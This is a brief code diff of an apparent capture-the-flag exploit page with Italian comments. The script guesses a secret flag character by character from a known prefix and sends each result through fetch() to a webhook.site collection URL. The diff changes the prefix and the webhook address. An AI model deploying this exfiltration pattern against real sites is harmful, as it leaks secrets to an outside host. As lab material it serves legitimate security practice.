@@ -22,12 +22,12 @@
     <script>
         // Array di tutti i caratteri possibili da testare
         const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-={}[]|:;"\'<>,.?/~`';
-        let flag = 'flag{Th3#aa'; // Inizializza con il prefisso noto della flag
+        let flag = 'flag{Th3#'; // Inizializza con il prefisso noto della flag
         let position = flag.length; // Posizione iniziale per il carattere successivo
 
         // Funzione per inviare i log al Webhook
         const logResult = async (message) => {
-            const webhookUrl = 'https://webhook.site/37bc43b6-0f0f-42ab-9191-0a5747e3f381'; // Sostituisci con il tuo URL di Webhook.site
+            const webhookUrl = 'https://webhook.site/fae7250d-7359-426f-86ac-c9ac48da7a05'; // Sostituisci con il tuo URL di Webhook.site
             try {
                 const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
                 const response = await fetch(urlWithParams, { method: 'GET' });
